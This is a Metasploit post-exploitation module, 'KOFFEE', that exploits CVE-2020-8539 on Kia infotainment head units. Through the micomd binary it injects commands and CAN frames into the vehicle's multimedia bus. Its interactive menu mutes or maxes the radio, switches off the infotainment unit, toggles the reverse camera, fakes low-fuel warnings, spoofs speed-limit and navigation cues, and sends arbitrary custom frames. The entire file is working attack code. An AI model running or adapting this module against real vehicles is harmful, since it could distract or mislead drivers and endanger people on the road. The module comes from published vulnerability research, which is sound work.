# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'readline'

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'KOFFEE - Kia OFFensivE Exploit',
        'Description' => %q{
          This module exploits the CVE-2020-8539, which is an Arbitrary Code Execution vulnerabilty that allows an to attacker execute the micomd binary file Kia Motors of Head Unit.
          This module has been tested on SOP.003.30.18.0703, SOP.005.7.181019 and SOP.007.1.191209 head unit software version.
          This module, run on an active session, allows an attacker to send crafted micomd commands that allow the attacker
          to control the head unit and send CAN bus frames into the Multimedia CAN (M-Can) of the vehicle.
        },
        'Author' =>
          [
            'Gianpiero Costantino',
            'Ilaria Matteucci'
          ],
        'References' =>
          [
            ['CVE', '2020-8539'],
            ['URL', 'https://sowhat.iit.cnr.it/pdf/IIT-20-2020.pdf']
          ],
        'Platform' => 'Android',
        'Arch' => [ARCH_ARMLE],
        'DisclosureDate' => '2020-12-02',
        'Targets' => [[ 'Automatic', {}]],
        'DefaultTarget' => 0,
        'License' => MSF_LICENSE
      )
    )
    register_options([
      OptString.new('MICOMD', [true, 'Path to micomd executable', '/system/bin/micomd']),
      OptString.new('PERIOD', [true, 'Time (ms) interval between two MICOM commands, aka Period of CAN frames', '0.200']),
      OptInt.new('NUM_MSG', [true, 'Number of MICOM commands sent each time', '5'])
    ])
  end

  def send(m_cmd)
    print_status(' -- Sending Command -- ')
    cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
    cmd_exec(cmd)
  end

  def send_out(m_cmd)
    print_status(' -- Sending Command -- ')
    cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
    cmd_exec(cmd)
  end

  def send_custom(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject #{m_cmd}"
    var = 0
    while var < datastore['NUM_MSG'].to_s.to_i
      cmd_exec(cmd)
      var += 1
      print_status("> Sending #{var} out of #{datastore['NUM_MSG']}")
      sleep(datastore['PERIOD'].to_s.to_f)
    end
  end

  def send_out_custom(m_cmd)
    cmd = "#{datastore['MICOMD']} -c inject-outgoing #{m_cmd}"
    var = 0
    while var < datastore['Num_msg'].to_s.to_i
      cmd_exec(cmd)
      var += 1
      print_status("> Sending #{var} out of #{datastore['NUM_MSG']}")
      sleep(datastore['PERIOD'].to_s.to_f)
    end
  end

  def run
    loop do
      print_status(' ')
      print_status("           `:+ydmNMMNmhs:
         .odMMMMMMMMMMMMMMm`
       /dM MMMMMMM MMMMMMM: o`
     /mMMM MMMMMM MMMMMMm-`yMs
   .dMMMMM MMMMM MMMMMm+ :mMMN
  :NMMMMMM MMMM MMMMh/ :hMMMMN
 /MMMMMMMM MMM Mmy/`.omMMMMMMy
.NMMMMMMMM my+:`./smMMMMMMMMN.
yMMMMMMNy/ `/shNMMMMMMMMMMMM/
NMMMMd/`-s MM MMMMMMMMMMMMN:
NMMd- +mMM MMM MMMMMMMMMMd.
sMo :mMMMM MMMM MMMMMMMm/
`/ oMMMMMM MMMMM MMMMd/
  .NMMMMMM MMMMMM do.
    :shmNMMNmdy+:`        ")
      print_status(' ')
      print_status(' -- Welcome, would you like a KOFFEE? --')
      print_status(' ')
      print_status("Make your choice:
     1. Mute/unmute radio
     2. Reduce radio volume
     3. Radio volume at maximum
     4. Low screen brightness
     5. High screen brightness
     6. Low fuel warning message
     7. Navigation full screen
     8. Set navigation address
     9. Seek down
     10. Seek Up
     11. Switch off Infotainment
     12. Switch On Infotainment
     13. Camera Reverse On
     14. Camera Reverse Off
     15. Inject pre-crafted CAN frames into MM bus
     16. Inject custom command
     0. Exit")
      n = Readline.readline('Koffee > ').to_i
      break if n.zero?

      case n
      when 1
        send('8351 04')
      when 2
        send_out('0112 F4 01')
      when 3
        send_out('0112 F0')
      when 4
        send('8353 07 01')
      when 5
        send('8353 07 00')
      when 6
        send('8353 0B 01')
      when 7
        send('8350 0C 01')
      when 8
        send('8350 0D 03')
      when 9
        send_out('133 01')
      when 10
        send_out('133 02')
      when 11
        send_out('170 00')
      when 12
        send_out('170 01')
      when 13
        send('8353 03 01')
      when 14
        send('8353 03 00')
      when 15
        print_status("Select the action:
         1. Change cluster language
         2. Change speed limit
         3. Round about far far far away
         4. Random navigation signals
         5. Modify radio info
         0. Back")
        s = Readline.readline('Koffee > ').to_i
        case s
        when 1
          print_status(' -- Korean -- ')
          send_out_custom('4D3 01')
          print_status(' -- Arabic -- ')
          send_out_custom('4D3 08')
          print_status(' -- Polish -- ')
          send_out_custom('4D3 0E')
          print_status(' -- Italian -- ')
          send_out_custom('4D3 12')
        when 2
          send_out_custom('4DB 00 0A')
          send_out_custom('4DB 00 2A')
          send_out_custom('4DB 00 3A')
          send_out_custom('4DB 00 5A')
          send_out_custom('4DB 00 7A')
          send_out_custom('4DB 00 9A')
          send_out_custom('4DB 00 AA')
          send_out_custom('4DB 00 BA')
        when 3
          print_status(' -- km -- ')
          send_out_custom('4D1 66 00 00 00 14 86 10 00')
          print_status(' -- mi -- ')
          send_out_custom('4D1 66 00 00 00 14 86 20 00')
          print_status(' -- ft -- ')
          send_out_custom('4D1 66 00 00 00 14 86 30 00')
          print_status(' -- yd -- ')
          send_out_custom('4D1 66 00 00 00 14 86 40 00')
          print_status(' -- No distance -- ')
          send_out_custom('4D1 66 00 00 00 14 86 50 00')
        when 4
          print_status(' -- Calculating the route -- ')
          send_out_custom('4D1 09')
          print_status(' -- Recalculating the route -- ')
          send_out_custom('4D1 0A')
          print_status(' -- Straight ahead -- ')
          send_out_custom('4D1 0D')
          print_status(' -- Exit on the Right -- ')
          send_out_custom('4D1 13')
          print_status(' -- Exit on the Left -- ')
          send_out_custom('4D1 14')
        when 5
          print_status(' -- USB Music -- ')
          send_out_custom('4D6 65')
          print_status(' -- Android Auto -- ')
          send_out_custom('4D6 6F')
          print_status(' -- FM 168.17 -- ')
          send_out_custom('4D6 11 9D 00 00 00 00 5F 83')
          print_status(' -- FM1 168.17 -- ')
          send_out_custom('4D6 12 9D 00 00 00 00 5F 83')
          print_status(' -- FM2 168.17 -- ')
          send_out_custom('4D6 13 9D 00 00 00 00 5F 83')
        else
          print_status('Nothing to do...')
        end
      when 16
        print_status("Type of sending:
         1. Inject
         2. Inject-outgoing
         0. Back")
        s = Readline.readline('Koffee > ').to_i

        case s
        when 1
          print_status('Insert the command (e.g.,  cmd byte1 byte2 byte3):')
          cmd = gets.chomp
          send_custom(cmd)
        when 2
          print_status('> Insert the command (e.g.,  cmd byte1 byte2 byte3):')
          cmd = gets.chomp
          send_out_custom(cmd)
        else
          print_status('Nothing to do...')
        end
      else
        print_status('Exiting')
      end
    end
  end
end
